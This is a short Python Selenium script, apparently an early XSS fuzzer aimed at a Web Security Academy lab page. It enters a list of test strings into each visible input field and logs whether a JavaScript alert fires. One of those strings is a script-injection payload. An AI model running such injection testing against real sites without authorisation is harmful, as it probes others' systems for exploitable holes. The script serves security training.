from selenium_classes import UrlOpener
from utility import open_payloads, help_open
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlunparse, urlparse, urlencode


#TODO switch over input display and selection to selenium
#TODO incorporate URL parameters 
def main():
    #test link -- doesn't currently work
    url = "https://ac561f4b1f6e6351c048500a00b100df.web-security-academy.net/?search=help"
    xpath = None
    #instantiating the selenium driver class that handles most things
    input_tester = UrlOpener(url)
    #This is the file open function in utility
    # payloads = open_payloads()
    payloads = [r"hello", r"123", r"test", r'"><script>alert("hello")</script>', r'anotherone']

    #initially load url that your testing will be based on
    input_tester.load_url(url)    
    input_fields = input_tester.list_inputs()
    num_inputs = len(input_fields)
    input_ids = []

    if xpath is not None:
        input_tester.pre_xpath(xpath)
    
    #debugging loop to display inputs to stdout
    for input in input_fields:
        if input.is_displayed() and input.is_enabled():
            print(input.get_attribute("id"))
            input_ids.append(str(input.get_attribute("id")))

    #main loop that gets current inputs, checks if they're "hidden"
    #then proceeds to enter payloads and return to the original url
    for i in range(num_inputs):
        curr_input = input_fields[i]
        if curr_input.is_displayed() and curr_input.is_enabled():
            for payload in payloads:
                curr_input = input_fields[i]
                curr_input.send_keys(payload)
                curr_input.submit()
                #try catch is for a selenium quirk where WebDriverWait stalls
                #and crashes the program if an alert pops up
                #This seems to work to log alerts
                try:
                    WebDriverWait(input_tester.get_driver(), 3).until(EC.alert_is_present(), "")
                    alert = input_tester.get_driver().switch_to.alert
                    alert.accept()
                    print("alert detected")
                except:
                    print("no alert detected")
                input_tester.load_url(url)
                input_fields = input_tester.list_inputs()

if __name__ == "__main__":
    main()

